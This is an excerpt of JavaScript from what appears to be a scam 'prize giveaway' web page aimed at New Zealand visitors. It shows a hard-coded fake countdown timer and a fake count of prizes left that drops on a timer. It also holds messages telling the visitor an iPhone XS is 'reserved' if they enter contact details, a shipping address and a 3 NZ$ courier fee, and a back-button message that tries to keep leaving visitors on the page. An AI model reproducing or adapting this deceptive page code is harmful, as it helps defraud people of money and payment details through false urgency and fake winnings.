...
var Quiz = function () {
  ...
  function init() {
    ...
    // if( getCookie("sp") == "1" ) {
	// 	quGroupList['0'].style.display = "none";
	...
	// 	document.getElementById('remainingCount').innerHTML = "2"
	// 	Magic.fadeIn(prize);
    // } else 
...
(function () {
  ...
  function onDOMContentLoaded() {
    // if( typeof getCookie("m") != "undefined" && typeof getCookie("m") != "undefined" ) {
    //   var nmins = getCookie("m");
	//   var nsecs = getCookie("s");
    //   document.getElementById('timer-mins').textContent = nmins;
    //   document.getElementById('timer-secs').textContent = nsecs;
    // }
    var nmins = 3;
    var nsecs = 49;
    document.getElementById('timer-mins').textContent = nmins;
    ...
    var takeitessage = '<div>Your <span class="marked">iPhone XS</span> is reserved!<br><br>Conditions of receipt:<br>1. On the next page, enter your contact information and shipping address;<br>2. Pay the fixed cost of courier delivery - 3 NZ$;<br>3. Your iPhone XS will be shipped within 5 business days by courier.</div>';
    ...
    var logomessage = '<div>Wait! Before going back to home page, answer 3 simple questions and get a chance to win <span class="marked">Samsung Galaxy S9, iPhone XS or iPad Air 2.</span></div>';
  ...
  window.addEventListener('showPrize', function() {
    ...
    setTimeout(decreasePrizesLeftCount, 5000);
	// if( getCookie("sp") != "1" ) setTimeout(decreasePrizesLeftCount, 5000);
	// setCookie("sp", "1");
  });
  ...
  function decreasePrizesLeftCount() {
    ...
    wrap.style.transition = "background-color 2000ms";
